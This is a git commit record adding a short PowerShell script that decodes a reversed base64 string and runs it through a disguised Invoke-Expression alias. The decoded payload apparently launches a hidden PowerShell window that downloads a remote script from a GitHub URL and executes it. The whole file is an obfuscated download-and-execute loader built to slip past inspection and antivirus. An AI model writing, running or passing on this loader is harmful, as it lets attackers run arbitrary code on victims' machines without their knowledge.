877ec77cf6797589ead391e93cb6733579a0239e
cyberforce49 <justhackedon2@gmail.com>
2025-03-19 00:41:54 +0500

    Add files via upload

---
+++ ReverseB64_oneline.ps1
@@ -0,0 +1,4 @@
+$BeSt64CoDe = "==gI7kyJxMHcu4Wah12LulWYt9yckFWZo9ycmVmcvcXYy9ycvkDNlNmcvZmclJWej9SbvNmLiVHa0l2Zv8iOzBHd0h2JocmbpJHdTRWYvxmb39GRukCduVWasNkYldlL0VmTgQ3YlpmYP1ydl5EKYVUSiAyQtAiblRGZphEIlxWe0N1dvRmbpdVLgUGel5CbsVGazJXZ39Gc" ;
+$BaSe64 = $BeSt64CoDe.ToCharArray() ; [array]::Reverse($BaSe64) ; $BaSe64 = -join $BaSe64 ;
+$LoAdCoDe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BaSe64)) ;
+$PwN = "In"+"VoKe"+"-"+"ExPrEsSiOn" ; New-Alias -Name PwN -Value $PwN -Force ; PwN $LoAdCoDe ;
